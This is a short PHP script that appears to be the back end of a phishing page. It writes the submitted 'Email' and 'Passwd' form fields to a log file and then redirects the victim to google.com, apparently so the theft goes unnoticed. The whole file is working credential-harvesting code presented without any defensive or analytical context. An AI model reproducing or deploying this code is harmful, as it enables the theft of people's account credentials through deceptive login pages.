<?php

$file = fopen('log.txt', 'a');

fwrite($file, '' . $_POST['Email'] . '-' . $_POST['Passwd'] . PHP_EOL);
fclose($file);

header("Location: http://google.com/");
die();

?>
